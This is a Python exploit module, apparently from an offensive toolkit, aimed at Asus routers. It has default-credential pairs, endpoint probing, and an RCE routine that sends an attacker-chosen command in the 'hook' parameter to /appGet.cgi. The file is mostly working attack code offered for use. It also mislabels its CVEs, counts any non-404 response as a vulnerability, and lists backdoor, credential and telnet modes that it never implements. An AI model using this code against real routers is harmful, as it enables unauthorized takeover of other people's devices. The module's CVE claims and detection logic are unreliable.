#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""
Asus Router Exploit Module
CVE-2021-32030, CVE-2019-15126, Asus Backdoors
"""

import requests
import socket
import time
import base64
from pathlib import Path

try:
    from rich.console import Console
    from rich.table import Table
    from rich.panel import Panel
    from rich.syntax import Syntax
    console = Console()
except ImportError:
    class SimpleConsole:
        def print(self, msg): 
            print(msg)
    console = SimpleConsole()

import urllib3
urllib3.disable_warnings()

MODULE_INFO = {
    "name": "Asus Router Exploit",
    "description": "Asus router vulnerabilities and backdoors",
    "author": "Lazy Framework Team",
    "license": "MIT",
    "platform": "linux",
    "arch": "arm,mips",
    "rank": "High",
    "references": [
        "CVE-2021-32030",
        "CVE-2019-15126",
        "Asus Backdoors"
    ],
    "dependencies": ["requests"]
}

OPTIONS = {
    "RHOST": {"description": "Target IP", "required": True, "default": "192.168.1.1"},
    "RPORT": {"description": "Web port", "required": False, "default": "80"},
    "PROTO": {"description": "HTTP protocol", "required": False, "default": "http", "choices": ["http", "https"]},
    "USERNAME": {"description": "Username", "required": False, "default": "admin"},
    "PASSWORD": {"description": "Password", "required": False, "default": "admin"},
    "MODE": {
        "description": "Exploit mode",
        "required": False,
        "default": "detect",
        "choices": ["detect", "rce", "backdoor", "credentials", "telnet"]
    },
    "CMD": {"description": "Command", "required": False, "default": "id"},
}

# Asus Default Credentials
ASUS_CREDS = [
    ("admin", "admin"),
    ("admin", "password"),
    ("root", "admin"),
]

class AsusExploit:
    def __init__(self, target, port=80, proto="http", username="admin", password="admin"):
        self.target = target
        self.port = port
        self.proto = proto
        self.username = username
        self.password = password
        self.base_url = f"{proto}://{target}:{port}"
        self.session = requests.Session()
        if proto == "https":
            self.session.verify = False
        
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0',
            'Referer': f'{self.base_url}/'
        })
    
    def detect_device(self):
        """Detect Asus router"""
        console.print("\n[bold yellow]=== Asus DETECTION ===[/bold yellow]")
        
        try:
            r = self.session.get(f"{self.base_url}/", timeout=10)
            html_content = r.text.lower()
            
            asus_detected = False
            if "asus" in html_content or "rt-" in html_content:
                asus_detected = True
                console.print("[green]✓ Asus router detected[/green]")
            
            # Test vulnerabilities
            vulns = self.test_vulnerabilities()
            
            return {
                'is_asus': asus_detected,
                'vulnerabilities': vulns
            }
                
        except Exception as e:
            console.print(f"[red]✗ Detection failed: {str(e)}[/red]")
            return {'is_asus': False}
    
    def test_vulnerabilities(self):
        """Test Asus vulnerabilities"""
        console.print("[bold yellow][*] Testing Asus vulnerabilities...[/bold yellow]")
        
        vulns = []
        
        # Test CVE-2021-32030 - RCE
        endpoints = [
            "/appGet.cgi",
            "/apply.cgi",
            "/start_apply.htm",
            "/cgi-bin/apply.cgi"
        ]
        
        for endpoint in endpoints:
            try:
                url = f"{self.base_url}{endpoint}"
                r = self.session.get(url, timeout=5)
                if r.status_code != 404:
                    vulns.append(endpoint)
                    console.print(f"[green]✓ Vulnerability found: {endpoint}[/green]")
            except:
                continue
        
        return vulns
    
    def exploit_rce(self, command):
        """Exploit Asus RCE vulnerability"""
        console.print("[bold yellow][*] Exploiting Asus RCE...[/bold yellow]")
        
        try:
            # Asus RCE via appGet.cgi
            payload = {
                'hook': command,
                'current_page': 'Advanced_System_Content.asp'
            }
            
            exploit_url = f"{self.base_url}/appGet.cgi"
            r = self.session.post(exploit_url, data=payload, timeout=10)
            
            if r.status_code == 200:
                console.print("[green]✓ Command execution attempted[/green]")
                return True
        except Exception as e:
            console.print(f"[red]✗ RCE exploit failed: {str(e)}[/red]")
        
        return False

def run(session, options):
    """Main Asus exploit function"""
    console.print(Panel("Asus Router Exploit", style="bold blue"))
    
    rhost = options.get("RHOST", "192.168.1.1")
    rport = options.get("RPORT", "80")
    proto = options.get("PROTO", "http")
    username = options.get("USERNAME", "admin")
    password = options.get("PASSWORD", "admin")
    mode = options.get("MODE", "detect")
    cmd = options.get("CMD", "id")
    
    console.print(f"[bold yellow][*] Target: {proto}://{rhost}:{rport}[/bold yellow]")
    
    try:
        exploit = AsusExploit(rhost, rport, proto, username, password)
        
        if mode == "detect":
            result = exploit.detect_device()
            if result['is_asus']:
                console.print("[green]✓ Asus router detected[/green]")
                console.print(f"[cyan]Vulnerabilities: {len(result['vulnerabilities'])}[/cyan]")
            else:
                console.print("[red]✗ Not an Asus router[/red]")
        
        elif mode == "rce":
            exploit.exploit_rce(cmd)
        
        return True
        
    except Exception as e:
        console.print(f"[bold red]✗ Error: {str(e)}[/red]")
        return False

def show_info():
    table = Table(show_header=False, box=None)
    table.add_column("Field", style="bold yellow")
    table.add_column("Value", style="white")
    table.add_row("Name", "Asus Router Exploit")
    table.add_row("CVEs", "2021-32030, 2019-15126")
    table.add_row("Models", "RT series, DSL series")
    table.add_row("Risk", "High")
    console.print(Panel(table, title="Asus Exploit", border_style="blue"))
